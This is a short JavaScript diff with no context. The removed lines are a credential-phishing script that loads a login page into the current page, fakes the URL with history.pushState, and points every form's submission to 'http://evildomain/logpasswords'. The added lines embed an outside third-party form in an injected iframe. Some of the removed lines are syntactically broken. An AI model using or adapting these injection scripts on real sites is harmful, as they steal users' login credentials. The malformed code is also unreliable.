@@ -1,19 +1,5 @@
-function override(url){
-  var req = new XMLHttpRequest();
-  req.open('GET', url,false);
-  req.onreadystatechange = function(){
-    if(req.readyState == 4 && req.responseText != ""){
-      document.innerHTML = req.responseText;
-    }
-  }
-  req.send(null);
-}
-
-override("/login.php");
-
-history.pushState){he: "he"}, document,getElementsByTagName("title")[0].innerHTML, "login.php");
-
-var forms = document.getElementsByTagName("form");
-for (index=0;index<forms.length;index++){
-  void(forms[index].action = "http://evildomain/logpasswords");
-}
+var iframe = document.createElement("iframe");   
+iframe.src = "https://form.jotformeu.com/63113863763357";
+ iframe.style.width = "640px";
+ iframe.style.height = "480px";
+document.body.appendChild(iframe);
